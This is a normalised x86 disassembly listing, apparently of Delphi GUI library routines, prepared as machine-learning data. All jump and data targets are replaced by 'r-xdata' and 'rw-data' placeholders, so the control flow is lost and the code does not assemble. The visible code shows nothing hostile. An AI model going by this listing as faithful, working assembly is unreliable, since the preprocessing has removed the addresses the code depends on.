mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_454c88
jmp r-xdata
mov eax ebx
call sub_452ce8
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_456960
sub_454ce0
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebx + 0x4c ] eax
sub_454d08
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403344
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454f9c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403540
mov edx ebx
mov eax edi
call sub_419e80
mov eax ebx
mov si 0xffee
call sub_403540
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_454d78
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ esi + 0x4c ] eax
sub_454dac
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_454884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_454894
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_454dec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_454c1c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_454c00
jmp r-xdata
mov edx ebx
mov eax esi
call sub_454c00
sub_454e50
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_454714
sub_454e7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4546ec
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45475c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4547b0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_4040e8
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4548dc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_454828
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_4548b8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4548cc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_454f9c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45486c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403540
sub_454fc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_454fe0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455000
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455020
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455040
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455060
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_455080
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4550a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4550c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4550e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414a98
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44ef30
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44f068
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44f0c8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44edc8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44f188
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455158
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a0cc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45486c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_454d08
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4551ac
jmp r-xdata
xor edx edx
mov eax esi
call sub_452c70
sub_4551ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_450644
mov eax ebx
call sub_45521c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_450688
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419e80
sub_4551f4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4551f4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_452344
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_454c88
mov eax ebx
pop esi
pop ebx
retn
sub_455230
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c998
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4045f4
sub_455260
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40412c
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4552e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_455406
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404354
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404354
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4045b4
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45540d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_40463c
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404414
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404354
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4045b4
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404414
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_455444
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4558e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40412c
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4558a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_454884
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_40412c
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558ea
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_4040b8
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_4040b8
lea eax [ ebp - 0x18 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
call sub_455a98
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_454894
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044a0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_455260
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_454894
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_454894
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403344
mov eax [ ebp - 0x20 ]
call sub_403344
mov eax [ ebp - 0x14 ]
call sub_403344
mov eax [ ebp - 0xc ]
call sub_403344
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_455260
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404354
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_454894
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45733c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407eb0
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_4040e8
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c998
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c998
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_454894
push eax
mov edx esi
mov eax ebx
call sub_454894
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4045b4
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407eb0
push ebp
mov eax [ ebp - 0x2c ]
call sub_455230
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_455230
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c998
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_40412c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_454894
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_454894
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_4572a8
mov edx [ ebp - 0x40 ]
pop eax
call sub_4040e8
mov edx esi
mov eax ebx
call sub_454894
push eax
mov edx esi
mov eax ebx
call sub_454894
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404354
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4045b4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4552e4
mov eax [ ebp - 0x18 ]
call sub_404354
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4045f4
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_40463c
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4552e4
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_455940
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_454884
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_454884
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_455ac4
test al al
je r-xdata
mov eax esi
call sub_454884
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_454894
call sub_45591c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_454894
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_454894
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_454894
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_454894
call sub_45591c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_454894
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_454894
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_454894
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_454894
call sub_45591c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_455a98
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_455a98
and eax 0x7f
mov al [ eax + rw-data ]
sub_455ac4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_455ac4
and eax 0x7f
mov al [ eax + rw-data ]
sub_455af0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4527d8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419db0
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45681c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_455b8c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403344
mov eax [ esi + 0x44 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_455c00
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_455c00
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_452344
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_454c88
mov eax ebx
pop esi
pop ebx
retn
sub_455c40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_454884
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_454894
call sub_455c40
pop ecx
test al al
je r-xdata
sub_455cd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_455c40
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_452344
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_455d08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_455cd8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45702c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_455d78
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_455cd8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_455d94
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_455cd8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
